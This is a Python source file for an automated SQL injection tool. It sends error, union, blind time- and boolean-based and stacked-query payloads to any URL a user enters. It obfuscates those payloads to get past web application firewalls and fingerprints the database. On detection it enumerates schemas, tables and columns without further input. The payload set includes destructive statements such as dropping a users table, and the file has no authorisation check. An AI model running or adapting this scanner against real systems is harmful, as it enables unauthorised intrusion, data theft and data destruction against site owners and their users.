import aiohttp
import asyncio
import os
import sys
import time
import urllib.parse
import re
import difflib
import random
import string

# Use absolute import paths
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
# Add type annotation comments to silence Pylance warnings
from path_manager import PathManager  # type: ignore
from config import load_config  # type: ignore

from aiohttp import ClientSession
from asyncio import Semaphore

def obfuscate_payload(payload):
    """Add random comments or encode payloads to bypass WAFs."""
    return payload.replace(" ", "/**/").replace("'", "%27")

def advanced_obfuscate_payload(payload):
    """Add random comments or split payloads to bypass WAFs."""
    # More advanced obfuscation techniques
    obfuscation_techniques = [
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace(" ", "%20"),
        lambda p: p.replace(" ", "+"),
        lambda p: p.replace("'", "%27"),
        lambda p: p.replace("'", "''"),
        lambda p: p.replace("=", "%3D"),
        lambda p: p.replace("OR", "/*!50000OR*/"),
        lambda p: p.replace("UNION", "/*!50000UNION*/"),
        lambda p: p.replace("SELECT", "/*!50000SELECT*/"),
    ]
    
    # Apply a random subset of obfuscation techniques
    for _ in range(random.randint(1, 3)):
        technique = random.choice(obfuscation_techniques)
        payload = technique(payload)
    
    return payload

def get_database_fingerprint(response_text):
    """Try to determine the database type from error messages."""
    fingerprints = {
        "MySQL": ["mysql", "MariaDB", "you have an error in your sql syntax", "1064", "1146"],
        "PostgreSQL": ["postgresql", "pg_", "pgsql", "syntax error at or near"],
        "SQLite": ["sqlite_error", "sqlite3", "sqlite"], 
        "MSSQL": ["microsoft sql server", "mssql", "sql server", "sqlstate", "line 1", "odbc"],
        "Oracle": ["oracle", "ora-", "pl/sql", "described in the oracle"]
    }
    
    response_lower = response_text.lower()
    for db, patterns in fingerprints.items():
        for pattern in patterns:
            if pattern in response_lower:
                return db
    
    return None

async def test_payload(session, target_url, parameter, payload, headers, proxies, log_file, method="GET", rate_limiter=None):
    if rate_limiter:
        await rate_limiter.acquire()
    
    # Generate a unique identifier for this request to detect blind injections
    canary = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    canary_payload = payload.replace("1=1", f"1=1 AND '{canary}'='{canary}'")
    
    try:
        # Baseline request to compare results against
        baseline_url = f"{target_url}?{parameter}=test" if method == "GET" else target_url
        baseline_data = {parameter: "test"} if method == "POST" else None
        
        async with session.request(method, baseline_url, headers=headers, proxy=proxies, data=baseline_data) as baseline_response:
            baseline_result = await baseline_response.text()
            baseline_status = baseline_response.status
            baseline_headers = dict(baseline_response.headers)
        
        # Test the payload
        test_url = f"{target_url}?{parameter}={urllib.parse.quote(canary_payload)}" if method == "GET" else target_url
        data = {parameter: canary_payload} if method == "POST" else None
        
        start_time = time.time()
        async with session.request(method, test_url, headers=headers, proxy=proxies, data=data) as response:
            result = await response.text()
            response_time = time.time() - start_time
            status_code = response.status
            response_headers = dict(response.headers)
            
            # Log the attempt regardless of finding a vulnerability
            path_manager = PathManager()
            resolved_path = path_manager.resolve_path(log_file)
            path_manager.ensure_file_exists(resolved_path)
            
            with open(resolved_path, 'a') as log:
                log.write(f"[TEST] URL: {test_url}\n")
                log.write(f"[TEST] Response time: {response_time:.2f}s, Status: {status_code}\n")
            
            # Get database type if possible
            db_type = get_database_fingerprint(result)
            if db_type:
                print(f"[+] Database type detected: {db_type}")
                with open(resolved_path, 'a') as log:
                    log.write(f"[+] Database type detected: {db_type}\n")
            
            # Detection methods
            detected = False
            detection_method = ""
            
            # 1. Error-based detection - look for SQL error messages
            error_patterns = [
                r"sql syntax.*?near", r"syntax error.*?in query", r"sql syntax.*?error",
                r"unclosed.*?quotation", r"quotation.*?after", r"syntax error", r"mysql",
                r"postgresql", r"sqlite", r"oracle", r"microsoft sql server", r"odbc",
                r"unterminated.*?quoted", r"warning: .*?error", r"warning: mysql"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, result.lower()):
                    detected = True
                    detection_method = "Error-based"
                    break
            
            # 2. Time-based detection
            if response_time > 5 and not detected:  # Adjust threshold as needed
                # Verify with a second request to confirm it's not a false positive
                second_start_time = time.time()
                async with session.request(method, test_url, headers=headers, proxy=proxies, data=data) as second_response:
                    await second_response.text()
                    second_response_time = time.time() - second_start_time
                    
                    if second_response_time > 5:
                        detected = True
                        detection_method = "Time-based"
            
            # 3. Boolean-based detection using diff comparison
            if not detected:
                true_payload = payload.replace("1=2", "1=1")
                false_payload = payload.replace("1=1", "1=2")
                
                true_url = f"{target_url}?{parameter}={urllib.parse.quote(true_payload)}" if method == "GET" else target_url
                false_url = f"{target_url}?{parameter}={urllib.parse.quote(false_payload)}" if method == "GET" else target_url
                
                true_data = {parameter: true_payload} if method == "POST" else None
                false_data = {parameter: false_payload} if method == "POST" else None
                
                async with session.request(method, true_url, headers=headers, proxy=proxies, data=true_data) as true_response:
                    true_result = await true_response.text()
                    true_status = true_response.status
                
                async with session.request(method, false_url, headers=headers, proxy=proxies, data=false_data) as false_response:
                    false_result = await false_response.text()
                    false_status = false_response.status
                
                # Compare response content differences
                if true_status != false_status:
                    detected = True
                    detection_method = "Boolean-based (status)"
                elif abs(len(true_result) - len(false_result)) > 10:  # Significant length difference
                    detected = True
                    detection_method = "Boolean-based (length)"
                else:
                    # More sophisticated diff analysis
                    similarity = difflib.SequenceMatcher(None, true_result, false_result).ratio()
                    if similarity < 0.95:  # If content differs by more than 5%
                        detected = True
                        detection_method = f"Boolean-based (diff: {similarity:.2f})"
            
            # 4. Content-based detection
            if not detected and canary in result:
                detected = True
                detection_method = "Canary-based"
            
            # 5. Union-based/Stacked query detection
            if not detected and "UNION SELECT" in payload:
                # Check for specific patterns in the response that might indicate successful UNION
                union_patterns = ["database version", "database name", "system user", "system tables"]
                for pattern in union_patterns:
                    if pattern in result.lower() and pattern not in baseline_result.lower():
                        detected = True
                        detection_method = "Union-based"
                        break
            
            # Report findings
            if detected:
                print(f"[+] SQL Injection detected at: {test_url} ({detection_method})")
                with open(resolved_path, 'a') as log:
                    log.write(f"[+] SQL Injection detected at: {test_url}\n")
                    log.write(f"[+] Detection method: {detection_method}\n")
                    log.write(f"[+] Payload: {canary_payload}\n")
                    if db_type:
                        log.write(f"[+] Database type: {db_type}\n")
                
                # Attempt to enumerate the database structure
                await enumerate_database(session, target_url, headers, proxies, log_file, method, db_type)
                return True
            
            print(f"[-] No SQL Injection detected at: {test_url}")
            return False
    
    except Exception as e:
        print(f"[-] Error testing {test_url}: {e}")
        if log_file:
            path_manager = PathManager()
            resolved_path = path_manager.resolve_path(log_file)
            path_manager.ensure_file_exists(resolved_path)
            print(f"[DEBUG] Writing error details to: {resolved_path}")
            with open(resolved_path, 'a') as log:
                log.write(f"[-] Error testing {test_url}: {e}\n")
        return False
    finally:
        if rate_limiter:
            rate_limiter.release()

async def enumerate_database(session, target_url, headers, proxies, log_file, method="GET", db_type=None):
    """Automate database enumeration if a vulnerability is detected."""
    print("[*] Attempting database enumeration...")
    if log_file:
        path_manager = PathManager()
        resolved_path = path_manager.resolve_path(log_file)
        path_manager.ensure_file_exists(resolved_path)
        print(f"[DEBUG] Writing enumeration results to: {resolved_path}")
    
    # Database-specific queries
    if db_type == "MySQL":
        queries = [
            "' UNION SELECT database(),version() --",
            "' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' --",
            "' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' --"
        ]
    elif db_type == "PostgreSQL":
        queries = [
            "' UNION SELECT current_database(),version() --",
            "' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'pg_catalog' AND table_schema != 'information_schema' --",
            "' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema != 'pg_catalog' AND table_schema != 'information_schema' --"
        ]
    elif db_type == "MSSQL":
        queries = [
            "' UNION SELECT DB_NAME(),@@version --",
            "' UNION SELECT table_schema,table_name FROM information_schema.tables --",
            "' UNION SELECT table_name,column_name FROM information_schema.columns --"
        ]
    elif db_type == "Oracle":
        queries = [
            "' UNION SELECT global_name,banner FROM global_name,v$version --",
            "' UNION SELECT owner,table_name FROM all_tables WHERE owner != 'SYS' --",
            "' UNION SELECT table_name,column_name FROM all_tab_columns WHERE owner != 'SYS' --"
        ]
    else:
        # Generic queries for unknown database
        queries = [
            "' OR 1=1--", "' UNION SELECT database(), NULL--", "' UNION SELECT NULL, version() --",
            "' UNION SELECT table_name, NULL FROM information_schema.tables--",
            "' UNION SELECT column_name, NULL FROM information_schema.columns--",
            "' AND SLEEP(1)--", "'; WAITFOR DELAY '0:0:1'--"  # Time-based for blind detection
        ]
    
    for query in queries:
        test_url = f"{target_url}?{urllib.parse.quote(query)}" if method == "GET" else target_url
        data = {query: query} if method == "POST" else None
        try:
            async with session.request(method, test_url, headers=headers, proxy=proxies, data=data) as response:
                result = await response.text()
                print(f"[+] Enumeration result: {result[:200]}...")  # Show first 200 chars
                if log_file:
                    with open(resolved_path, 'a') as log:
                        log.write(f"[+] Enumeration query: {query}\n")
                        log.write(f"[+] Enumeration result: {result[:1000]}\n")  # Log first 1000 chars
        except Exception as e:
            print(f"[-] Error during enumeration: {e}")

async def test_sql_injection(target_url, parameter, payloads, config, method="GET"):
    headers = {"User-Agent": config["custom_user_agent"]} if config["custom_user_agent"] else {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
    }
    proxies = config["proxies"]
    log_file = config["output_log_file"]
    timeout = config["timeout"]
    rate_limit = config["rate_limit"]
    cookies = {}
    
    # Enhanced payloads categorized by injection type
    enhanced_payloads = {
        "error_based": [
            "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1'--", "\" OR \"1\"=\"1\"--",
            "' OR '1'='1' --", "1' OR '1'='1", "1\" OR \"1\"=\"1",
            "1' OR '1'='1' --", "1\" OR \"1\"=\"1\" --",
            "' OR 1=1 #", "\" OR 1=1 #", "' OR '1'='1' #",
            "1 OR 1=1", "1' OR 1=1--", "1\" OR 1=1--",
            "1 AND 1=2 UNION SELECT 1,2,3,4,5--",
            "' AND 1=2 UNION SELECT 1,2,3,4,5--",
            "\" AND 1=2 UNION SELECT 1,2,3,4,5--"
        ],
        "union_based": [
            "' UNION SELECT NULL--", "\" UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "\" UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3,4,5--", "\" UNION SELECT 1,2,3,4,5--",
            "' AND 1=2 UNION SELECT 1,2,3,4,5--",
            "\" AND 1=2 UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT database()--",
            "' UNION SELECT schema_name FROM information_schema.schemata--", 
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name,table_name FROM information_schema.columns--"
        ],
        "blind_time_based": [
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--", 
            "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR SLEEP(5)--", "\" OR SLEEP(5)--", 
            "' AND SLEEP(5)--", "\" AND SLEEP(5)--",
            "' OR pg_sleep(5)--", "\" OR pg_sleep(5)--",
            "' OR WAITFOR DELAY '0:0:5'--", "\" OR WAITFOR DELAY '0:0:5'--",
            "' OR BENCHMARK(10000000,MD5(1))--", "\" OR BENCHMARK(10000000,MD5(1))--",
            "' OR 1 IN (SELECT pg_sleep(5))--",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
            "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))A)--"
        ],
        "blind_boolean_based": [
            "' AND 1=1--", "\" AND 1=1--",
            "' AND 1=2--", "\" AND 1=2--",
            "' OR 1=1--", "\" OR 1=1--", 
            "' OR 1=2--", "\" OR 1=2--",
            "' AND (SELECT COUNT(*) FROM table)>0--",
            "' OR EXISTS(SELECT 1 FROM users)--",
            "' AND SUBSTR(version(),1,1)='5'--",
            "' OR SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='A'--"
        ],
        "stacked_queries": [
            "'; SELECT version()--", 
            "\"; SELECT version()--",
            "'; SELECT pg_sleep(5)--",
            "\"; WAITFOR DELAY '0:0:5'--",
            "'; DROP TABLE users--",
            "'; INSERT INTO logs VALUES('hacked')--"
        ],
        "waf_bypass": [
            "/*!50000'*/OR/*!50000'*/1/*!50000'*/=/*!50000'*/1--",
            "'+OR+'%25'='%25",
            "'+OR+1=1--+a",
            "'+/*!50000OR*/+1=1--",
            "'+UnIoN+SeLeCt+1,2,3--",
            "'+OR/**/'1'='1",
            "'/**/OR/**/1=1"
        ]
    }
    
    # Combine all payloads from categories if no custom payloads provided
    if not payloads:
        all_payloads = []
        for category, category_payloads in enhanced_payloads.items():
            all_payloads.extend(category_payloads)
            print(f"[INFO] Added {len(category_payloads)} {category} payloads")
        
        payloads = all_payloads
    
    # Apply obfuscation to all payloads to bypass WAFs
    final_payloads = []
    for payload in payloads:
        # Add both regular and obfuscated versions of each payload
        final_payloads.append(payload)
        final_payloads.append(advanced_obfuscate_payload(payload))
    
    # Remove duplicates
    payloads = list(set(final_payloads))
    
    # Add a counter to track progress
    total_payloads = len(payloads)
    vulnerabilities_found = 0
    print(f"[INFO] Starting scan with {total_payloads} payloads against {target_url}")
    
    # Add logging for negative results too
    path_manager = PathManager()
    resolved_path = path_manager.resolve_path(log_file)
    path_manager.ensure_file_exists(resolved_path)
    with open(resolved_path, 'a') as log:
        log.write(f"[INFO] Starting scan at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        log.write(f"[INFO] Target URL: {target_url}\n")
        log.write(f"[INFO] Parameter: {parameter}\n")
        log.write(f"[INFO] Method: {method}\n")
        log.write(f"[INFO] Total payloads: {total_payloads}\n\n")
    
    rate_limiter = Semaphore(rate_limit)
    async with ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
        tasks = []
        progress = 0
        
        # Process payloads in batches to avoid overwhelming the server
        batch_size = min(rate_limit * 2, 20)  # Keep batch size reasonable
        for i in range(0, len(payloads), batch_size):
            batch = payloads[i:i + batch_size]
            batch_tasks = [
                test_payload(session, target_url, parameter, payload, headers, proxies, log_file, method=method, rate_limiter=rate_limiter)
                for payload in batch
            ]
            
            # Wait for this batch to complete
            batch_results = await asyncio.gather(*batch_tasks)
            
            # Update progress and count vulnerabilities
            progress += len(batch)
            vulnerabilities_found += sum(1 for result in batch_results if result)
            print(f"[INFO] Progress: {progress}/{total_payloads} payloads tested, {vulnerabilities_found} vulnerabilities found")
    
    # After all tasks complete, add a summary
    with open(resolved_path, 'a') as log:
        log.write(f"\n[INFO] Scan completed at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        log.write(f"[INFO] Total payloads tested: {total_payloads}\n")
        if vulnerabilities_found > 0:
            log.write(f"[INFO] {vulnerabilities_found} SQL injection vulnerabilities were found!\n")
        else:
            log.write(f"[INFO] No SQL injection vulnerabilities were found.\n")
    
    print(f"[INFO] Scan completed. Tested {total_payloads} payloads. Found {vulnerabilities_found} vulnerabilities. Results saved to {log_file}")
    return vulnerabilities_found > 0

if __name__ == "__main__":
    config = load_config("config.json")
    target_url = input("Enter the target URL: ")
    parameter = input("Enter the parameter to test: ")
    custom_payloads = input("Enter custom payloads separated by commas (or leave blank for default): ").split(",")
    payloads = [payload.strip() for payload in custom_payloads if payload.strip()] if custom_payloads else []
    method = input("Enter the HTTP method to use (GET or POST): ").strip().upper()
    asyncio.run(test_sql_injection(target_url, parameter, payloads, config, method=method))
